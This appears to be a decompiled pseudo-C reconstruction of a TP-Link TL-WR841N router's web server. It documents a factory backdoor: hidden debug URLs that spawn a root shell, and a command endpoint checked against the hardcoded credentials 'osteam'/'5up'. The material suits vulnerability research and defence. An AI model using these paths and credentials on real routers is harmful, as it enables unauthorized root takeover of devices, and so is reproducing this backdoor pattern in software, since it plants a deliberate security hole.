# Decompiled MIPS Assembly / Pseudo-C Reconstruction
# Target: /usr/bin/httpd (TP-Link TL-WR841N v7 Firmware 120201)
# Binary Architecture: MIPS 32-bit Big-Endian (Atheros AR7241, MIPS 24Kc)
# Vulnerability: Undocumented Factory Backdoor with Hardcoded Credentials

/*
 * Source: httpWlanAdvCfgRpmsInit() at VMA 0x482748
 * File Offset: 0x82748 in /usr/bin/httpd
 * 
 * Registers hidden debug endpoints during web server initialization:
 */
void httpWlanAdvCfgRpmsInit(void)
{
    // Normal Web Interface Endpoint
    httpRpmConfAdd(2, "/userRpm/WlanAdvRpm.htm", wlanAdvRpmHtm);

    // [BACKDOOR 1] Hardware Test & Flash Manipulation (Atheros Radio Test)
    httpRpmConfAdd(2, "/userRpmNatDebugRpm26525557/start_art.html", ArtRpmHtm);

    // [BACKDOOR 2] Pseudo-Terminal Initialization (Spawns /bin/sh via forkpty)
    httpRpmConfAdd(2, "/userRpmNatDebugRpm26525557/linux_cmdline.html", CmdRpmHtm);

    // [BACKDOOR 3] Command Execution & Output Retrieval Interface
    httpRpmConfAdd(2, "/userRpm/DebugResultRpm.htm", DebugResultRpmHtm);
}

/*
 * Source: CmdRpmHtm() at VMA 0x482c84
 * Spawns a root pseudo-terminal session running /bin/sh:
 */
int CmdRpmHtm(http_req_t *req)
{
    if (!pty_started) {
        pid = forkpty(&master_fd, NULL, NULL, NULL);
        if (pid == 0) {
            // Child process executes root shell
            execl("/bin/sh", "/bin/sh", NULL);
            exit(1);
        }
        pty_started = 1;
    }
    // Redirects browser to web terminal interface
    httpRedirect(req, "/userRpm/HttpDebugRpm.htm");
    return 0;
}

/*
 * Source: DebugResultRpmHtm() at VMA 0x482e34
 * Handles incoming commands from the browser and executes them on the pty:
 */
int DebugResultRpmHtm(http_req_t *req)
{
    char *user = httpGetParam(req, "usr");
    char *pass = httpGetParam(req, "passwd");
    char *cmd  = httpGetParam(req, "cmd");

    // [HARDCODED CREDENTIAL CHECK]
    // Compares user to "osteam" and password to "5up"
    if (strcmp(user, "osteam") != 0 || strcmp(pass, "5up") != 0) {
        httpSendResponse(req, "####User or Password not correct###\n");
        return -1;
    }

    // Writes user command directly to master PTY descriptor connected to /bin/sh:
    if (cmd != NULL && strlen(cmd) > 0) {
        write(master_fd, cmd, strlen(cmd));
        write(master_fd, "\n", 1);
    }

    // Reads output back from PTY and formats as JavaScript array:
    char output_buf[4096];
    int n = read(master_fd, output_buf, sizeof(output_buf) - 1);
    output_buf[n] = '\0';

    httpSendJsArray(req, "cmdResult", output_buf);
    return 0;
}
